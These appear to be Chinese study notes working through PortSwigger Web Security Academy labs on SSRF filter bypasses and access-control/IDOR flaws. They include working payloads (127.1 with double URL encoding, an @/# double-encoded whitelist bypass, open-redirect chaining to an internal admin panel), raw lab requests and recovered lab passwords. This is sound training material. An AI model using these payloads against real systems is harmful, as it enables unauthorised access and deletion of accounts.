一个个测试，看看谁被过滤了

<details class="lake-collapse"><summary id="udcb64efb"></summary><p id="ufe1a7c73" class="ne-p"><span class="ne-text">●两层黑名单过滤，两个绕过：</span></p><p id="u237b3ded" class="ne-p"><span class="ne-text"> 第一层：IP黑名单。 禁止了 localhost、127.0.0.1。</span></p><p id="ue5f25775" class="ne-p"><span class="ne-text">  绕过：用IP简写 127.1。IPv4允许省略中间的0，127.1 展开就是 127.0.0.1。</span></p><p id="ufb466486" class="ne-p"><span class="ne-text">  第二层：路径关键词黑名单。 禁止了 admin 这个词。</span></p><p id="u2a515b7f" class="ne-p"><span class="ne-text">  绕过：双重URL编码。字母 a URL编码是 %61，再编码一次变成 %2561。所以 admin →%2561dmin。</span></p><p id="ud8908e20" class="ne-p"><span class="ne-text">  过滤器拿到后做一次解码 →看到 %61dmin →不包含 admin 三个连续字母 →放行。但服务器实际发出请求时再做解码 →得到 admin。</span></p><p id="u08adfbbe" class="ne-p"><span class="ne-text">  最终payload：</span></p><p id="u4f4df215" class="ne-p"><span class="ne-text">  stockApi=</span><a href="http://127.1/%2561dmin" data-href="http://127.1/%2561dmin" target="_blank" class="ne-link"><span class="ne-text">http://127.1/%2561dmin</span></a></p><p id="ub133a534" class="ne-p"><span class="ne-text">  先侦察，确认能看到管理面板。然后再：</span></p><p id="ua6cb498e" class="ne-p"><span class="ne-text">  stockApi=</span><a href="http://127.1/%2561dmin/delete?username=carlos" data-href="http://127.1/%2561dmin/delete?username=carlos" target="_blank" class="ne-link"><span class="ne-text">http://127.1/%2561dmin/delete?username=carlos</span></a></p></details>


---

## Lab: SSRF with whitelist-based input filter
This lab has a stock check feature which fetches data from an internal system. 

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. 

The developer has deployed an anti-SSRF defense you will need to bypass. 

[ACCESS THE LAB](https://portswigger.net/academy/labs/launch/7e946e5cc74a1c4df272ba01df0415b53548e0dfdb326d35f1d58e9b38dcbda4?referrer=%2fweb-security%2fssrf%2flab-ssrf-with-whitelist-filter)

白名单过滤



请求：

```python
POST /product/stock HTTP/2
Host: 0a870088036cf2268040d0c20043004e.web-security-academy.net
Cookie: session=LbE6vsWIQvQky90GdXzZIfC3x5TU3lKQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a870088036cf2268040d0c20043004e.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0a870088036cf2268040d0c20043004e.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

[http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1](http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1)

测试：

stockApi=[http://stock.weliketoshop.net:8080/admin](http://stock.weliketoshop.net:8080/admin)

stockApi=[http://localhost/](http://localhost/)

stockApi=[http://localhost/](http://localhost/)admin

stockApi=[http://127.1](http://127.0.0.1)/admin

---

stockApi=[http://username@stock.weliketoshop.net/](http://username@stock.weliketoshop.net/)

 内网地址返回 500 → 内网可达但端口无服务 / 读取文件失败 。

说明支持 user@host 格式，hostname取的是 @ 后面的部分



<details class="lake-collapse"><summary id="ue6f7e1eb"></summary><p id="ue728eaa3" class="ne-p"><span class="ne-text">●这个实验的思考过程，三步推演：</span></p><hr id="E05sC" class="ne-hr"><p id="u0208d476" class="ne-p"><span class="ne-text">  Step 1：确认约束边界</span></p><p id="uffb5abca" class="ne-p"><span class="ne-text">  改了 stockApi，被拒。提示是白名单——只允许 stock.weliketoshop.net 这个hostname。那问题就变成：怎么让过滤器看到的hostname合法，但实际请求打到别处？</span></p><p id="u2731565f" class="ne-p"><span class="ne-text">  Step 2：找两个解析引擎的分歧点</span></p><p id="uaf4a1855" class="ne-p"><span class="ne-text">  两个引擎各解码一次，中间有个差异就能钻。</span></p><p id="u1f20b333" class="ne-p"><span class="ne-text">  试 </span><a href="http://user@stock.weliketoshop.net/" data-href="http://user@stock.weliketoshop.net/" target="_blank" class="ne-link"><span class="ne-text">http://user@stock.weliketoshop.net/</span></a><span class="ne-text"> →通过。说明URL里 @ 是被支持的，过滤器取 @ 后面的 stock.weliketoshop.net 做hostname匹配。</span></p><p id="u95fb7b0f" class="ne-p"><span class="ne-text">  那如果我在 @ 前面放一个字符，让过滤器看到一个合法的hostname，但让HTTP库看到一个不同的hostname？</span></p><p id="u48d66a1e" class="ne-p"><span class="ne-text">  Step 3：制造分歧</span></p><p id="uffe5cf86" class="ne-p"><span class="ne-text">是URL片段分隔符——</span><a href="http://hostA#@host这种结构，过滤器可能看到hostB，HTTP库却看到hostA（因为" data-href="http://hostA#@host这种结构，过滤器可能看到hostB，HTTP库却看到hostA（因为" target="_blank" class="ne-link"><span class="ne-text">http://hostA#@host这种结构，过滤器可能看到hostB，HTTP库却看到hostA（因为</span></a><span class="ne-text"> # 后面都是片段）。</span></p><p id="u0c01d2d3" class="ne-p"><span class="ne-text">  但直接写 # 会被过滤器识破。双重编码 # →%2523。</span></p><p id="ub819326c" class="ne-p"><span class="ne-text">  最终payload结构：</span></p><p id="u6116d627" class="ne-p"><span class="ne-text">  </span><a href="http://localhost:80%2523@stock.weliketoshop.net/admin" data-href="http://localhost:80%2523@stock.weliketoshop.net/admin" target="_blank" class="ne-link"><span class="ne-text">http://localhost:80%2523@stock.weliketoshop.net/admin</span></a></p><p id="u1a30232d" class="ne-p"><span class="ne-text">  过滤器解码一次 →看到 %</span><span class="ne-text">23@stock.weliketoshop.net</span><span class="ne-text"> →hostname匹配 stock.weliketoshop.net →放行。</span></p><p id="uf0e18000" class="ne-p"><span class="ne-text">  HTTP库再解码一次 →%23 变 # →实际hostname是 localhost:80 →打到本地。</span></p><hr id="iYMvS" class="ne-hr"><p id="ucff1b150" class="ne-p"><span class="ne-text">  核心模式就一个公式：</span></p><p id="ud85408b6" class="ne-p"><span class="ne-text">  ▎ 白名单绕过 = 找到一个URL字符，让过滤器识别A表达式（合法的），让HTTP库识别B表达式（你要攻击的）。# 和 @ 的组合就是这个分歧的制造工具。</span></p></details>


## Lab: SSRF with filter bypass via open redirection vulnerability
This lab has a stock check feature which fetches data from an internal system. 

To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`. 

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 





请求：

```python
POST /product/stock HTTP/2
Host: 0a0100a80415d894815c842a008200d5.web-security-academy.net
Cookie: session=MVmHLls1jkXgfX7CNDnvQA3m1B9WFWaO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0100a80415d894815c842a008200d5.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://0a0100a80415d894815c842a008200d5.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```

<font style="color:rgb(0, 0, 0);">stockApi=/product/stock/check?productId=2&storeId=1</font>

这里只允许访问当前站点的路径。



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1783005897859-7910464f-05e2-432f-8041-b32964f40652.png)

尝试抓取Next product的包，这是访问站内其他资源，看看能不能从这里做重定向。



```python
GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/2
Host: 0a0100a80415d894815c842a008200d5.web-security-academy.net
Cookie: session=MVmHLls1jkXgfX7CNDnvQA3m1B9WFWaO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0100a80415d894815c842a008200d5.web-security-academy.net/product?productId=2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

修改path值
/product/nextProduct?path=http://example.com
example.com是随便写的例子
只是用来测试的——随便换一个外部地址都行，比如 http://192.168.0.12:8080/admin。目的不是访问example.com，而是确认 path
  参数能不能被利用来跳转到外部。能跳就证明有开放重定向。
```

响应

```python
HTTP/2 302 Found
Location: /product/nextProduct?path=http://example.com
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

302—— 临时重定向  

在原来的stock请求处，修改值：

stockApi=/product/nextProduct?path=[http://192.168.0.12:8080/admin](http://192.168.0.12:8080/admin)

/product/nextProduct——让过滤器认为这是站内，放行。如果返回是200说明成功，

再删除用户

stockApi=/product/nextProduct?path=[http://192.168.0.12:8080/admin/delete?username=carlos](http://192.168.0.12:8080/admin/delete?username=carlos)









# <font style="color:rgb(51, 51, 51);">访问控制/IDOR（Access control vulnerabilities）</font>
## <font style="color:rgb(51, 51, 51);">Lab: Unprotected admin functionality</font>
This lab has an unprotected admin panel. 

Solve the lab by deleting the user `carlos`. 

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1783008611694-5d2f08ef-2995-48d4-912a-9635abbcba01.png)

为什么要访问robots.txt

为什么能看出来Disallow对应的是路径。



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1783048539778-8449e012-e081-4d41-b232-cb1fcfe44049.png)

---

## Lab: Unprotected admin functionality with unpredictable URL
This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application. 

Solve the lab by accessing the admin panel, and using it to delete the user `carlos`. 



查看网页源代码，搜索admin，发现路径

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1783049349350-e8a6bdf4-9c7a-420a-ab98-e7f70873ffcf.png)



思路：

  robots.txt → 不需要，太简单了，第一个实验已经做过了

  随机URL →猜不到，但必须有人能访问

  谁需要知道这个URL？→管理员

  管理员怎么知道？→必须被告知

  怎么被告知？→写在页面上，或者写在发给他的文件里



 如果是服务器session判断 isAdmin=true 然后渲染到页面，那是服务器端判断。但实验设计者在JS里用 var isAdmin =false——说明这个判断在前端。

前端判断 + 需要隐藏路径 =路径必然在前端代码的某个地方，只是不显示。要么在JS变量里，要么在HTML注释里，要么在一个隐藏的<a>标签里。

 不用猜。看源代码就行。所有前端检查都是透明的。

 这就是这个实验想让你学到的——你通过前端代码找到了隐藏路径，攻击者也一样。



---

## Lab: User role controlled by request parameter
This lab has an admin panel at `/admin`, which identifies administrators using a forgeable cookie. 

Solve the lab by accessing the admin panel and using it to delete the user `carlos`. 

You can log in to your own account using the following credentials: `wiener:peter`



我们访问/admin，将cookie中的false改为true

在删除的时候也要这样修改







## Lab: User ID controlled by request parameter 
This lab has a horizontal privilege escalation vulnerability on the user account page. 

To solve the lab, obtain the API key for the user `carlos` and submit it as the solution. 

You can log in to your own account using the following credentials: `wiener:peter`



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1783054140242-185a0c0a-10eb-4c11-b10f-be43741f3c11.png)修改id的值，做到越权



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1783054316930-851c5422-b675-4da0-bddb-e3c144189bce.png)



## Lab: User ID controlled by request parameter with password disclosure
This lab has user account page that contains the current user's existing password, prefilled in a masked input. 

To solve the lab, retrieve the administrator's password, then use it to delete the user `carlos`. 

You can log in to your own account using the following credentials: `wiener:peter`



登录给的账户，因为要删除账户，所以要去管理员的界面，尝试修改id的值为admin或者`administrator`

`administrator`

用重放，看响应，得到密码

0sq9inskg5qvtxglnf66

登录账户进入面板，即可删除账号。





## Lab: Insecure direct object references
This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs. 

Solve the lab by finding the password for the user `carlos`, and logging into their account. 



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/45828822/1783057266093-2cfecb75-106a-4774-8496-d8846800740f.png)

我们发现view transcript会下载文件，抓取这个包，尝试修改下载的文件名。看看能不能得到密码。

91a6bvwfjdrh3ttxko3r





















